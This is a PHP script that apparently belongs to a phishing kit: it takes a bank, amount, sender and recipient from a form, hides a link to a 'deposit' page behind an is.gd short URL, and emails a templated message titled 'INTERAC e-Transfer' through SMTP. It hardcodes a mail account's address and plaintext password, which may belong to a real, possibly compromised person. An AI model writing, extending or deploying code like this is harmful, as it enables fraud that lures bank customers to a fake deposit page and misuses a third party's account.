<?php
// Start or resume the session
session_start();

// Include PHPMailer and other necessary libraries
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';
require 'phpmailer/src/Exception.php';

function shortenURL($url) {
    $api_url = 'https://is.gd/create.php?format=simple&url=' . urlencode($url);
    return file_get_contents($api_url);
}

// Check if the form was submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve form data and store them in session variables
    $_SESSION['bank'] = $_POST['bank-account'];
    $_SESSION['amount'] = $_POST['amount'];
    $_SESSION['receivers_name'] = $_POST['receivers_name'];
    $_SESSION['receivers_email'] = $_POST['receivers_email'];
    $_SESSION['sender_name'] = $_POST['sender_name'];
    
    // Add other form fields to session variables as needed...

    // Generate the long URL
    $long_url = 'https://' . $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php';

    // Shorten the long URL
    $short_url = shortenURL($long_url);

    // Calculate the date 30 days in the future and format it
    $expireDate = date('F d, Y', strtotime('+30 days'));

    // Create a placeholders array for replacement in the email template
    $placeholders = array(
        '{{etransfer_interac_ca}}' => $short_url,
        '{{line}}' => $expireDate,
        '{{username}}' => $_SESSION['username'], // Assuming you have this in a session cookie
        '{{photo_href}}' => $_SESSION['photo_href'], // Assuming you have this in a session cookie
        '{{bank}}' => $_SESSION['bank'],
        '{{amount}}' => $_SESSION['amount'],
        '{{photo_link}}' => $_SESSION['photo_link'], // Assuming you have this in a session cookie
        '{{link}}' => $_SESSION['link'], // Assuming you have this in a session cookie
        '{{EXPIRE}}' => $_SESSION['EXPIRE'], // Assuming you have this in a session cookie
        '{{expire}}' => $_SESSION['expire'], // Assuming you have this in a session cookie
        '{{link}}' => $_SESSION['link'], // Assuming you have this in a session cookie
        '{{sender_name}}' => $_SESSION['sender_name'], // Assuming you have this in a session cookie
        '{{memo}}' => $_SESSION['memo'], // Assuming you have this in a session cookie
        '{{receivers_name}}' => $_SESSION['receivers_name'],
        '{{receivers_email}}' => $_SESSION['receivers_email']
    );

    // Read the email template from a file
    $message = file_get_contents('LEVEL1-3.html');

    // Replace placeholders with actual data
    $message = str_replace(array_keys($placeholders), array_values($placeholders), $message);

    // Create a new PHPMailer instance
    $mail = new PHPMailer();

    // SMTP configuration
    $mail->IsSMTP();
    $mail->SMTPSecure = 'tls';
    $mail->Host = $_SESSION['host']; // Assuming you have this in a session cookie
    $mail->Port = '587'; // Assuming you have this in a session cookie
    $mail->SMTPAuth = true;
    $mail->Username = 'andallard@mymts.net'; // Assuming you have this in a session cookie
    $mail->Password = 'Batman123'; // Assuming you have this in a session cookie

    // Email content
    $mail->SetFrom('andallard@mymts.net', $_SESSION['sender_name']); // Assuming you have this in a session cookie
    $mail->AddAddress($_SESSION['receivers_email']);
    $mail->Subject = 'INTERAC e-Transfer: ' . $_SESSION['sender_name']; // Assuming you have this in a session cookie
    $mail->IsHTML(true);
    $mail->CharSet = 'utf-8';
    $mail->Body = $message;

    // Send the email
    if ($mail->send()) {
        // Redirect to the confirmation page
        header('Location: confirmation.php');
        exit;
    } else {
        echo 'Message could not be sent.';
        echo 'Mailer Error: ' . $mail->ErrorInfo;
    }
}
?>
